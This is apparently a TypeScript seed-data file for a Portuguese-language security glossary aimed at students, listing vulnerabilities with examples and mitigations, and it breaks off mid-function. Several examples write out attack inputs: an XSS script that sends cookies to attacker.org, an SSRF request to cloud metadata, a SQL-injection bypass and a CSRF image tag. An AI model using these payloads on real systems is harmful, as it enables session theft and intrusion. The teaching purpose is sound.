import fs from 'fs';
import path from 'path';

export interface Category {
  id: string;
  name: string;
  description: string;
  badge_label: string;
  sort_order: number;
}

export interface Vulnerability {
  id: string;
  title: string;
  category_id: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  short_summary: string;
  detailed_description: string;
  practical_example: string;
  mitigation: string;
  cwe_id: string;
  owasp_reference: string;
  attack_vector: string;
  impact_scope: string;
  created_at: string;
  updated_at: string;
}

export interface Suggestion {
  id: string;
  term_title: string;
  category_id: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  description: string;
  example: string;
  student_name: string;
  student_email: string;
  status: 'pending' | 'approved' | 'rejected';
  admin_notes?: string;
  created_at: string;
}

interface DatabaseState {
  categories: Category[];
  vulnerabilities: Vulnerability[];
  suggestions: Suggestion[];
}

const DATA_DIR = path.resolve(process.cwd(), 'data');
const DATA_FILE = path.resolve(DATA_DIR, 'security_x_store.json');

const INITIAL_CATEGORIES: Category[] = [
  {
    id: 'owasp-top10',
    name: 'OWASP Top 10 Web',
    description: 'Principais riscos de segurança em aplicações web modernos conforme a Open Web Application Security Project.',
    badge_label: 'Web Application',
    sort_order: 1,
  },
  {
    id: 'network-infra',
    name: 'Redes & Infraestrutura',
    description: 'Vulnerabilidades em protocolos de rede, servidores, firewalls e camadas de transporte.',
    badge_label: 'Infraestrutura',
    sort_order: 2,
  },
  {
    id: 'auth-access',
    name: 'Autenticação & Controle de Acesso',
    description: 'Falhas em verificação de identidade, tokens de sessão, permissões e privilégios de usuário.',
    badge_label: 'Identidade & Acesso',
    sort_order: 3,
  },
  {
    id: 'data-crypto',
    name: 'Criptografia & Vazamento de Dados',
    description: 'Uso inadequado de algoritmos de cifragem, chaves estáticas e armazenamento desprotegido de dados sensíveis.',
    badge_label: 'Criptografia',
    sort_order: 4,
  },
  {
    id: 'api-services',
    name: 'Segurança de APIs & Microsserviços',
    description: 'Vulnerabilidades emergentes em endpoints REST, GraphQL, desserialização e chamadas remotas.',
    badge_label: 'APIs & Cloud',
    sort_order: 5,
  },
];

const INITIAL_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'vuln-sqli',
    title: 'SQL Injection (Injeção de SQL)',
    category_id: 'owasp-top10',
    severity: 'Critical',
    short_summary: 'Inserção de comandos SQL maliciosos através de entradas de formulários não sanitizadas para manipular o banco de dados.',
    detailed_description: 'Ocorre quando dados fornecidos pelo usuário são concatenados diretamente em comandos SQL sem validação ou parametrização. O interpretador de banco de dados não consegue distinguir entre o comando legítimo e o código inserido pelo atacante, permitindo leitura não autorizada de dados, alteração de tabelas e até execução de comandos no sistema operacional hospedeiro.',
    practical_example: "Exemplo clássico em formulário de login:\nCampo de usuário preenchido com: \"admin' OR '1'='1\".\nA query gerada se torna:\nSELECT * FROM usuarios WHERE username = 'admin' OR '1'='1' AND password = 'xyz';\nComo '1'='1' é sempre verdadeiro, a validação é burlada e o atacante obtém acesso à conta sem senha.",
    mitigation: '1. Utilizar sempre Prepared Statements (consultas parametrizadas) ou ORMs consolidados.\n2. Aplicar o princípio do menor privilégio para o usuário de conexão do banco.\n3. Implementar Web Application Firewall (WAF) como camada complementar.',
    cwe_id: 'CWE-89',
    owasp_reference: 'A03:2021-Injection',
    attack_vector: 'HTTP Request / Formulário de Entrada',
    impact_scope: 'Confidencialidade, Integridade e Disponibilidade Total do Banco',
    created_at: new Date(Date.now() - 86400000 * 12).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 12).toISOString(),
  },
  {
    id: 'vuln-xss-stored',
    title: 'Cross-Site Scripting Persistente (Stored XSS)',
    category_id: 'owasp-top10',
    severity: 'High',
    short_summary: 'Scripts maliciosos em JavaScript são gravados permanentemente no servidor e executados no navegador de outros usuários.',
    detailed_description: 'Ocorre quando uma aplicação recebe entrada não confiável (por exemplo, na área de comentários de um fórum ou no perfil de um usuário) e a armazena no banco de dados sem sanitização prévia. Quando qualquer outro estudante ou administrador visita a página afetada, o script é carregado e executado no contexto do navegador da vítima, podendo roubar cookies de sessão (Session Hijacking) ou redirecionar para páginas de phishing.',
    practical_example: 'Em um fórum de alunos, o atacante publica o comentário:\n<script>fetch("https://attacker.org/steal?cookie=" + encodeURIComponent(document.cookie));</script>\nSempre que um colega abre o tópico, seus cookies de sessão são enviados silenciosamente para o servidor do atacante.',
    mitigation: '1. Escapar e codificar adequadamente todo conteúdo dinâmico antes de renderizá-lo no HTML.\n2. Utilizar a flag HttpOnly em cookies de autenticação para impedir leitura via JS.\n3. Configurar Content Security Policy (CSP) robusta.',
    cwe_id: 'CWE-79',
    owasp_reference: 'A03:2021-Injection',
    attack_vector: 'Inputs salvos em banco / Fóruns e Perfis',
    impact_scope: 'Sequestro de Sessão e Execução de Ações Não Autorizadas',
    created_at: new Date(Date.now() - 86400000 * 10).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 10).toISOString(),
  },
  {
    id: 'vuln-bola',
    title: 'BOLA / IDOR (Broken Object Level Authorization)',
    category_id: 'api-services',
    severity: 'Critical',
    short_summary: 'Falta de validação se o usuário autenticado realmente possui permissão para acessar o identificador de recurso solicitado.',
    detailed_description: 'É a vulnerabilidade número 1 do OWASP API Top 10. Acontece quando a API expõe um endpoint que aceita o ID de um objeto (por exemplo, /api/pedidos/1024) e confia que o usuário solicitante só buscará seus próprios dados, deixando de verificar no banco se o registro 1024 pertence de fato ao usuário autenticado.',
    practical_example: 'O aluno João está logado e inspeciona a chamada da rede:\nGET /api/relatorios/estudante/8892\nAo trocar manualmente o ID na URL para 8893, a API retorna o boletim confidencial de outro colega com notas e dados pessoais sem bloquear a requisição.',
    mitigation: '1. Validar no backend se o usuário ativo (obtido pelo token JWT/sessão) é o proprietário ou possui papel autorizado para o recurso.\n2. Preferir identificadores não sequenciais, como UUIDs v4 criptograficamente seguros.',
    cwe_id: 'CWE-639',
    owasp_reference: 'API1:2023-Broken Object Level Authorization',
    attack_vector: 'Parâmetro de URL / Payload de API REST',
    impact_scope: 'Exposição Massiva de Dados Pessoais de Outros Usuários',
    created_at: new Date(Date.now() - 86400000 * 8).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 8).toISOString(),
  },
  {
    id: 'vuln-ssrf',
    title: 'Server-Side Request Forgery (SSRF)',
    category_id: 'owasp-top10',
    severity: 'Critical',
    short_summary: 'Indução do servidor da aplicação a disparar requisições de rede para serviços internos ou metadados de nuvem.',
    detailed_description: 'Ocorre quando uma funcionalidade web solicita uma URL externa (como importar avatar por URL ou webhook) e faz a requisição em nome do servidor sem restringir os destinos permitidos. O atacante pode apontar para endereços de loopback (127.0.0.1) ou metadados de nuvem (169.254.169.254), acessando credenciais mestras de instâncias AWS/GCP.',
    practical_example: 'Uma funcionalidade de download de foto de perfil recebe:\nPOST /api/perfil/avatar-url\nPayload: {"url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"}\nO servidor backend requisita o endpoint de nuvem e devolve a chave privada do cluster.',
    mitigation: '1. Implementar listas estritas de protocolos e domínios permitidos (Allowlist).\n2. Bloquear resolução de DNS para faixas privadas (RFC 1918 e metadados de nuvem).\n3. Desativar redirecionamentos HTTP automáticos em clientes de requisição.',
    cwe_id: 'CWE-918',
    owasp_reference: 'A10:2021-Server-Side Request Forgery',
    attack_vector: 'Entrada de URL externa processada pelo servidor',
    impact_scope: 'Acesso a Redes Internas e Vazamento de Credenciais de Nuvem',
    created_at: new Date(Date.now() - 86400000 * 7).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 7).toISOString(),
  },
  {
    id: 'vuln-mitm-arp',
    title: 'ARP Spoofing / Man-in-the-Middle (MitM)',
    category_id: 'network-infra',
    severity: 'High',
    short_summary: 'Envenenamento da tabela ARP de uma rede local para interceptar e alterar o tráfego entre clientes e o roteador.',
    detailed_description: 'No protocolo ARP (Address Resolution Protocol), não há autenticação nativa nas mensagens de resposta. Um atacante conectado na mesma rede Wi-Fi ou Ethernet pode enviar pacotes ARP falsos alegando que o endereço IP do gateway padrão possui o seu próprio endereço MAC. Dispositivos da rede começam a enviar todo o tráfego para a máquina do atacante antes que ele chegue à internet.',
    practical_example: 'Em uma rede universitária aberta, o atacante executa ferramentas como arpspoof. Os colegas que navegam na web sem TLS têm suas senhas e conversas lidas em texto claro pelo invasor.',
    mitigation: '1. Habilitar Dynamic ARP Inspection (DAI) e DHCP Snooping em switches gerenciáveis.\n2. Forçar uso de HTTPS com HSTS em todas as aplicações web.\n3. Utilizar VPN corporativa/acadêmica com túnel cifrado em redes públicas.',
    cwe_id: 'CWE-300',
    owasp_reference: 'A02:2021-Cryptographic Failures',
    attack_vector: 'Rede Local (LAN / Wi-Fi)',
    impact_scope: 'Interceptação de Credenciais e Modificação de Tráfego',
    created_at: new Date(Date.now() - 86400000 * 6).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 6).toISOString(),
  },
  {
    id: 'vuln-syn-flood',
    title: 'SYN Flood (Negação de Serviço TCP)',
    category_id: 'network-infra',
    severity: 'Medium',
    short_summary: 'Sobrecarga da fila de conexões pendentes do servidor enviando múltiplos pacotes SYN sem completar o handshake.',
    detailed_description: 'Durante o aperto de mãos de três vias do protocolo TCP (SYN -> SYN-ACK -> ACK), o servidor aloca recursos de memória para cada conexão semiaberta. No ataque de SYN Flood, o invasor dispara milhares de solicitações SYN falsificando IPs de origem ou simplesmente nunca enviando o ACK final. A tabela de conexões se esgota e novos estudantes legítimos recebem erro de conexão recusada.',
    practical_example: 'Envio de centenas de milhares de pacotes SYN por segundo para a porta 443 do portal estudantil, preenchendo o buffer de conexões e impedindo que alunos acessem o sistema de matrícula.',
    mitigation: '1. Ativar SYN Cookies no kernel do sistema operacional do servidor.\n2. Reduzir o tempo limite de espera por SYN-ACK (timeout).\n3. Utilizar proteção contra DDoS e firewalls stateful com rate limiting.',
    cwe_id: 'CWE-400',
    owasp_reference: 'A04:2021-Insecure Design',
    attack_vector: 'Camada de Transporte TCP',
    impact_scope: 'Indisponibilidade do Serviço para Todos os Usuários',
    created_at: new Date(Date.now() - 86400000 * 5).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 5).toISOString(),
  },
  {
    id: 'vuln-weak-jwt',
    title: 'Assinatura Fraca ou Nula em JWT (None Algorithm)',
    category_id: 'auth-access',
    severity: 'Critical',
    short_summary: 'Aceitação indevida de tokens JWT com cabeçalho contendo "alg": "none" ou assinatura com chave simétrica fraca.',
    detailed_description: 'JSON Web Tokens (JWT) dependem de uma assinatura criptográfica para garantir que as reivindicações (claims) não foram alteradas. Bibliotecas mal configuradas podem aceitar o algoritmo "none", permitindo que qualquer usuário altere seu cargo para "admin" e envie o token sem assinatura.',
    practical_example: 'O atacante decodifica o cabeçalho do token:\n{"alg": "HS256", "typ": "JWT"}\nEle altera para:\n{"alg": "none", "typ": "JWT"}\nNo payload ele muda "role": "estudante" para "role": "admin" e apaga a parte final da assinatura. O backend vulnerável aceita e concede privilégio total.',
    mitigation: '1. Rejeitar categoricamente tokens com "alg": "none".\n2. Garantir que a biblioteca de validação force o algoritmo esperado de forma explícita.\n3. Usar chaves secretas longas com alta entropia ou chaves assimétricas seguras.',
    cwe_id: 'CWE-347',
    owasp_reference: 'A07:2021-Identification and Authentication Failures',
    attack_vector: 'Cabeçalho de Autorização HTTP (Bearer Token)',
    impact_scope: 'Escalação Total de Privilégios para Administrador',
    created_at: new Date(Date.now() - 86400000 * 4).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 4).toISOString(),
  },
  {
    id: 'vuln-hardcoded-keys',
    title: 'Chaves Criptográficas Hardcoded no Código Fonte',
    category_id: 'data-crypto',
    severity: 'High',
    short_summary: 'Inclusão de segredos, chaves de API ou senhas de banco de dados diretamente nos arquivos de código ou repositório Git.',
    detailed_description: 'Desenvolvedores frequentemente inserem chaves de serviço ou salts de criptografia como constantes no código durante o desenvolvimento inicial. Caso o repositório seja público ou outros membros da equipe tenham acesso, essas chaves são comprometidas.',
    practical_example: 'No arquivo de configuração:\nconst JWT_SECRET = "minha_senha_super_secreta_123";\nQualquer atacante que clonar o repositório pode forjar tokens de autenticação válidos para qualquer usuário do sistema.',
    mitigation: '1. Armazenar segredos exclusivamente em variáveis de ambiente (.env) ou cofres como AWS Secrets Manager / Vault.\n2. Implementar ferramentas de verificação de pré-commit (como git-secrets ou truffleHog).\n3. Adicionar arquivos .env ao .gitignore imediatamente.',
    cwe_id: 'CWE-798',
    owasp_reference: 'A02:2021-Cryptographic Failures',
    attack_vector: 'Repositórios Git / Código-Fonte',
    impact_scope: 'Comprometimento Irreversível de Contas e Bancos de Dados',
    created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 3).toISOString(),
  },
  {
    id: 'vuln-rate-limiting',
    title: 'Ausência de Rate Limiting (Ataque de Força Bruta)',
    category_id: 'auth-access',
    severity: 'High',
    short_summary: 'Permissão irrestrita de tentativas sucessivas de login ou recuperação de senha em curtos intervalos de tempo.',
    detailed_description: 'Quando uma rota de autenticação não limita o número de requisições por IP ou por conta em um período de tempo, invasores podem rodar dicionários com milhões de senhas populares (wordlists como RockYou) até encontrar a credencial correta.',
    practical_example: 'Um bot dispara 500 requisições por segundo para /api/login testando senhas comuns ("123456", "senha2026") para o e-mail de um professor, descobrindo a senha em poucos segundos.',
    mitigation: '1. Aplicar rate limiting com bibliotecas como express-rate-limit ou no gateway (Redis/Cloudflare).\n2. Implementar bloqueio temporário ou CAPTCHA adaptativo após 5 tentativas incorretas.\n3. Exigir autenticação multifator (MFA).',
    cwe_id: 'CWE-307',
    owasp_reference: 'A07:2021-Identification and Authentication Failures',
    attack_vector: 'Endpoint de Login e Recuperação de Senha',
    impact_scope: 'Quebra de Contas e Roubo de Acesso',
    created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 2).toISOString(),
  },
  {
    id: 'vuln-insecure-deserialization',
    title: 'Desserialização Insegura de Objetos',
    category_id: 'api-services',
    severity: 'Critical',
    short_summary: 'Processamento de dados binários ou serializados enviados pelo cliente sem validação, resultando em Execução Remota de Código (RCE).',
    detailed_description: 'A serialização converte estruturas de dados em sequências de bytes para transmissão ou armazenamento. Se a aplicação desserializa objetos controlados pelo usuário em linguagens como Java, Python ou Node.js, um atacante pode injetar sequências maliciosas conhecidas como "gadget chains" que invocam métodos perigosos do sistema.',
    practical_example: 'Envio de um cookie ou payload JSON/YAML modificado contendo instruções mágicas de execução de processo do sistema (ex.: comando rm -rf ou netcat reverso).',
    mitigation: '1. Evitar formatos de serialização dependentes de linguagem nativa; priorizar formatos agnósticos simples como JSON padrão.\n2. Assinar criptograficamente qualquer dado serializado com HMAC antes da transmissão.\n3. Executar o interpretador em ambiente isolado (sandbox/container com permissões mínimas).',
    cwe_id: 'CWE-502',
    owasp_reference: 'A08:2021-Software and Data Integrity Failures',
    attack_vector: 'Cookies de Sessão / Mensagens de Fila / Payloads',
    impact_scope: 'Execução Remota de Código (RCE) no Servidor',
    created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 2).toISOString(),
  },
  {
    id: 'vuln-dns-tunneling',
    title: 'DNS Tunneling (Exfiltração de Dados por DNS)',
    category_id: 'network-infra',
    severity: 'Medium',
    short_summary: 'Codificação e envio de dados sigilosos dentro de consultas DNS para contornar restrições de firewall corporativo.',
    detailed_description: 'Muitas redes corporativas e acadêmicas bloqueiam saídas HTTP/HTTPS não autorizadas, mas quase sempre permitem consultas DNS (porta 53 UDP) para servidores de nomes. Malwares utilizam isso encapsulando dados em subdomínios, permitindo comunicação bidirecional com o centro de comando (C2) sem ser detectado.',
    practical_example: 'A máquina infectada envia sucessivas consultas DNS como:\nZGF2aWQgc2VuaGE=.exemplo-c2.net\nO servidor DNS autoritativo do atacante recebe a consulta e decodifica a informação que vazou da rede interna.',
    mitigation: '1. Inspecionar o volume e comprimento das consultas DNS com sistemas IDS/IPS.\n2. Adotar DNS seguro (DNS over HTTPS / DNSSEC) e resolução através de resolvers internos validados.\n3. Bloquear tráfego direto de clientes na porta 53 para a internet.',
    cwe_id: 'CWE-319',
    owasp_reference: 'A02:2021-Cryptographic Failures',
    attack_vector: 'Consultas UDP porta 53 (DNS)',
    impact_scope: 'Exfiltração Discreta de Dados e Comando Remoto (C2)',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-clickjacking',
    title: 'Clickjacking (UI Redressing)',
    category_id: 'owasp-top10',
    severity: 'Medium',
    short_summary: 'Sobreposição da aplicação legítima em um iframe invisível para induzir o usuário a clicar em ações indesejadas.',
    detailed_description: 'O invasor constrói uma página atrativa e posiciona por cima, de forma transparente via CSS (opacity: 0), um iframe contendo a página logada da vítima. Ao clicar no suposto botão do site malicioso, a vítima executa a ação sensível dentro do iframe sem perceber.',
    practical_example: 'O usuário logado no portal estudantil acessa uma página maliciosa e clica em um botão colorido, acionando na verdade o botão "Cancelar Matrícula" da faculdade que estava invisível logo abaixo do cursor.',
    mitigation: '1. Configurar Content-Security-Policy com frame-ancestors \'none\' ou \'self\'.\n2. Enviar cabeçalho X-Frame-Options: DENY ou SAMEORIGIN.\n3. Usar atributos SameSite=Strict em cookies de autenticação.',
    cwe_id: 'CWE-1021',
    owasp_reference: 'A05:2021-Security Misconfiguration',
    attack_vector: 'Página maliciosa de terceiros com iframe',
    impact_scope: 'Execução Involuntária de Ações de Alto Impacto',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-algorithmic-bias',
    title: 'Racismo Algorítmico & Vieses em Sistemas de IA',
    category_id: 'api-services',
    severity: 'Critical',
    short_summary: 'Falha sistêmica em modelos de machine learning que reproduz e amplifica discriminações históricas em decisões automatizadas.',
    detailed_description: 'Identificada no artigo da UFPR (Botelho-Francisco, 2025) como uma dimensão crítica das vulnerabilidades digitais em IA. Ocorre quando algoritmos preditivos e redes neurais são treinados com conjuntos de dados desbalanceados ou com preconceitos humanos embutidos. O modelo aprende correlações espúrias que penalizam grupos vulneráveis em sistemas de reconhecimento facial, moderação de conteúdo, concessão de crédito e triagem estudantil.',
    practical_example: 'Um sistema de proctoring (vigilância de provas online) com IA acusa repetidamente estudantes negros de "movimentos suspeitos" ou não reconhece seus rostos sob iluminação padrão, reprovando automaticamente alunos sem revisão humana.',
    mitigation: '1. Realizar auditorias independentes de viés e paridade estatística antes do deploy do modelo.\n2. Curadoria ativa e diversificada de bases de treino com técnicas de de-biasing.\n3. Garantir direito a recurso e revisão humana mandatória em decisões de alto impacto (IA Explicável / XAI).',
    cwe_id: 'CWE-1039',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão Técnico-Científica & Sociocultural',
    attack_vector: 'Pipeline de Treinamento de Dados e Inferência de IA',
    impact_scope: 'Violação da Dignidade Humana, Discriminação Sistêmica e Exclusão Social',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-data-poisoning',
    title: 'Envenenamento de Dados em IA (Data Poisoning & Adversarial ML)',
    category_id: 'api-services',
    severity: 'High',
    short_summary: 'Manipulação intencional do conjunto de treinamento de modelos de aprendizado de máquina para implantar backdoors ou falsear classificações.',
    detailed_description: 'Conforme discutido nos estudos de vulnerabilidades digitais e machine learning (Grieger et al., 2021), modelos modernos dependem de grandes volumes de dados que muitas vezes são raspados da internet sem validação de proveniência. Atacantes injetam amostras cuidadosamente corrompidas no pipeline de aprendizado, fazendo com que o modelo aprenda padrões ocultos que respondem a gatilhos específicos ("triggers") do invasor.',
    practical_example: 'Injeção de pequenos ruídos em imagens de placas de trânsito em um dataset público usado por carros autônomos. Quando o carro detecta um adesivo específico em uma placa de "PARE", o modelo a classifica erroneamente como "Velocidade Máxima 80 km/h".',
    mitigation: '1. Validar a integridade criptográfica e a proveniência dos datasets de treinamento.\n2. Implementar sanitização e detecção estatística de anomalias e outliers em pipelines de MLOps.\n3. Aplicar técnicas de treinamento adversário robusto e validação cruzada contínua.',
    cwe_id: 'CWE-1039',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão Técnico-Científica',
    attack_vector: 'Ingestão de Dados de Treinamento / Pipelines MLOps',
    impact_scope: 'Manipulação de Decisões de IA, Burlas de Filtros e Backdoors Ocultas',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-datafication-surveillance',
    title: 'Dataficação Abusiva & Capitalismo de Vigilância',
    category_id: 'data-crypto',
    severity: 'High',
    short_summary: 'Coleta excessiva, opaca e sistemática de pegadas digitais para perfilamento comportamental e monetização não consentida.',
    detailed_description: 'Conceito abordado por Zuboff (2021) e Couldry (2019) no artigo da UFPR. Trata-se da transformação de cada ação humana em dados quantificáveis (dataficação) sem a devida transparência técnica. As plataformas realizam extração contínua de metadados, localização, biometria e relações sociais, alimentando sistemas de predição comportamental que desafiam a privacidade e a autodeterminação dos cidadãos.',
    practical_example: 'Um aplicativo acadêmico de estudos solicita permissão desnecessária de localização em tempo real, acesso a contatos e identificador de publicidade (GAID/IDFA), transmitindo dados comportamentais para 14 data brokers de publicidade direcionada.',
    mitigation: '1. Implementar o princípio de Privacy by Design e Minimização de Dados (LGPD Art. 6º, III).\n2. Auditar bibliotecas SDK de terceiros e telemetria incluídas em softwares acadêmicos.\n3. Utilizar anonimização com privacidade diferencial (Differential Privacy) e controle granular de permissões.',
    cwe_id: 'CWE-359',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão Socioeconômica & Geopolítica',
    attack_vector: 'Telemetria de Aplicativos / SDKs de Terceiros e Cookies',
    impact_scope: 'Perda de Privacidade, Perfilamento Invasivo e Mercantilização de Dados Pessoais',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-platform-lockin',
    title: 'Plataformização Monopolista & Lock-in de Infraestrutura',
    category_id: 'network-infra',
    severity: 'Medium',
    short_summary: 'Dependência assimétrica e estrutural de ecossistemas fechados de Big Techs que compromete a soberania digital e resiliência de serviços essenciais.',
    detailed_description: 'O artigo da UFPR destaca a análise de Van Dijck (2022) sobre a infraestruturalização das Big Techs do Norte Global. Quando instituições de ensino, governos e empresas migram toda sua arquitetura para serviços proprietários fechados, perdem a autonomia sobre seus fluxos informacionais. Caso o fornecedor sofra uma indisponibilidade ou imponha mudanças unilaterais de tarifas e termos, a instituição fica refém sem alternativa de migração rápida.',
    practical_example: 'Uma universidade inteira com 40 mil alunos hospeda correio, aulas e gestão de notas exclusivamente em um ecossistema proprietário de nuvem. Uma pane global de DNS ou suspensão unilateral de conta desativa completamente as operações acadêmicas por dias.',
    mitigation: '1. Adotar estratégias multi-cloud e ambientes baseados em contêineres e tecnologias abertas (Kubernetes, Linux, PostgreSQL).\n2. Garantir portabilidade completa de dados com exportação automatizada e formatos abertos.\n3. Fomentar infraestruturas soberanas e redes acadêmicas descentralizadas.',
    cwe_id: 'CWE-1188',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão Geopolítica & Socioeconômica',
    attack_vector: 'Camada de Infraestrutura em Nuvem Proprietária',
    impact_scope: 'Ponto Único de Falha Global, Perda de Soberania Digital e Risco Operacional Crítico',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-iot-industry4',
    title: 'Vulnerabilidades em Dispositivos IoT & Indústria 4.0',
    category_id: 'network-infra',
    severity: 'High',
    short_summary: 'Dispositivos hiperconectados (sensores, câmeras, atuadores) operando sem criptografia, com credenciais estáticas e sem ciclo de patches.',
    detailed_description: 'Na Quarta Revolução Industrial, como discute o artigo da UFPR, a proliferação da Internet das Coisas (IoT) acelera a fragilidade das próprias máquinas. Sensores industriais, câmeras e eletrodomésticos inteligentes são frequentemente projetados com foco em custo mínimo, dispensando camadas básicas de segurança como inicialização segura (Secure Boot), criptografia de tráfego e mecanismos de atualização de firmware.',
    practical_example: 'Invasão de uma botnet IoT (estilo Mirai) que escaneia a porta 23 (Telnet) e infecta milhares de roteadores e câmeras de laboratórios usando credenciais de fábrica como "admin:admin", transformando-os em zumbis para ataques de negação de serviço (DDoS).',
    mitigation: '1. Isolar dispositivos IoT em VLANs separadas sem comunicação direta com a rede administrativa.\n2. Exigir alteração obrigatória de credenciais padrão no primeiro uso.\n3. Desativar protocolos legados de texto claro (Telnet, HTTP, SNMPv1) em favor de SSH e TLS com certificados mútuos.',
    cwe_id: 'CWE-1274',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão Técnico-Científica & Materialidades',
    attack_vector: 'Firmware Desatualizado / Protocolos de Rede Desprotegidos',
    impact_scope: 'Sequestro de Equipamentos Físicos, Paradas de Linhas de Produção e Ataques de DDoS',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-hardware-materialities',
    title: 'Obsolescência e Insegurança em Materialidades Digitais (Hardware)',
    category_id: 'network-infra',
    severity: 'Medium',
    short_summary: 'Vulnerabilidades inerentes à camada física dos computadores, servidores, processadores e descarte inseguro de dispositivos eletrônicos.',
    detailed_description: 'Inspirado no conceito de "materialidades digitais" (Bollmer, 2019) trabalhado no artigo da UFPR. A segurança não reside apenas no software; a microarquitetura de silício (como vulnerabilidades Spectre e Meltdown em processadores), a fragilidade física de cabos submarinos e datacenters e o descarte incorreto de mídias de armazenamento com dados residuais representam riscos severos à integridade dos sistemas.',
    practical_example: 'Descarte de servidores antigos de um órgão público em leilão de sucata sem desmagnetização ou destruição física dos discos rígidos. O comprador recupera dados confidenciais de milhares de cidadãos usando ferramentas simples de forense digital.',
    mitigation: '1. Adotar procedimentos certificados de destruição de dados (NIST SP 800-88) e trituração física de mídias sensíveis.\n2. Aplicar mitigações de microcódigo contra ataques de canal lateral (Spectre/Meltdown/Downfall).\n3. Proteger fisicamente as salas de servidores e racks com controle de acesso biométrico e monitoramento ambiental.',
    cwe_id: 'CWE-1189',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão das Materialidades Digitais',
    attack_vector: 'Camada Física de Hardware / Canais Laterais de CPU e Descarte',
    impact_scope: 'Vazamento Irreversível de Memória, Ataques de Canal Lateral e Espionagem Física',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'vuln-dark-patterns',
    title: 'Manipulação Algorítmica e Dark Patterns de Interface',
    category_id: 'owasp-top10',
    severity: 'High',
    short_summary: 'Desenho ardiloso de fluxos de interface que explora vulnerabilidades cognitivas humanas para induzir ações prejudiciais e perda de controle.',
    detailed_description: 'Conforme a abordagem de vulnerabilidade sociocultural e de design de plataformas do artigo da UFPR, as plataformas moldam interações para seus próprios interesses econômicos. Dark patterns (padrões obscuros) são truques visuais que forçam estudantes e usuários a aceitar termos abusivos de privacidade, dificultam o cancelamento de cadastros ou camuflam consentimentos de compartilhamento de dados.',
    practical_example: 'Um site de conteúdo acadêmico apresenta um botão gigante em verde neon dizendo "Continuar para Download Grátis", que na verdade instala um adware e autoriza envio de notificações push maliciosas, enquanto o link legítimo de download está em cinza claro e fonte minúscula.',
    mitigation: '1. Aplicar diretrizes de design ético e acessível com escolhas claras e simétricas (botões de Aceitar e Rejeitar com mesmo peso visual).\n2. Eliminar caixas de seleção pré-marcadas para consentimento de privacidade.\n3. Realizar testes de usabilidade defensiva para certificar que o usuário mantém total controle de suas escolhas.',
    cwe_id: 'CWE-1021',
    owasp_reference: 'Artigo UFPR 2025 / Dimensão Sociocultural & Engenharia Social',
    attack_vector: 'Interface do Usuário (UI/UX) Enganosa',
    impact_scope: 'Coerção do Usuário, Coleta Não Consentida de Dados e Perda de Autonomia Digital',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
    updated_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
];

const INITIAL_SUGGESTIONS: Suggestion[] = [
  {
    id: 'sug-csrf',
    term_title: 'Cross-Site Request Forgery (CSRF)',
    category_id: 'owasp-top10',
    severity: 'High',
    description: 'Ataque que induz o navegador do usuário autenticado a executar requisições HTTP maliciosas não intencionais contra uma aplicação na qual ele está logado.',
    example: 'Um e-mail de phishing contém uma tag <img src="https://banco.com/transferir?valor=500&para=invasor">. Se o banco não usar tokens anti-CSRF, a transferência é efetuada automaticamente com a sessão ativa.',
    student_name: 'Mariana Silva (Estudante de Segurança)',
    student_email: 'mariana.silva@faculdade.edu.br',
    status: 'pending',
    created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
  },
  {
    id: 'sug-padding-oracle',
    term_title: 'Padding Oracle Attack',
    category_id: 'data-crypto',
    severity: 'High',
    description: 'Vulnerabilidade em modos de cifra de bloco como CBC onde mensagens de erro revelam se o padding criptográfico foi preenchido corretamente.',
    example: 'Ao tentar decifrar um token, a aplicação retorna HTTP 500 para padding inválido e HTTP 200 para padding correto, permitindo que o atacante decifre bytes um a um.',
    student_name: 'Lucas Ferreira',
    student_email: 'lucas.ferreira@computacao.uf.br',
    status: 'pending',
    created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
];

class SecurityStore {
  private state: DatabaseState;

  constructor() {
    this.state = this.loadState();
  }

  private loadState(): DatabaseState {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }

      if (fs.existsSync(DATA_FILE)) {
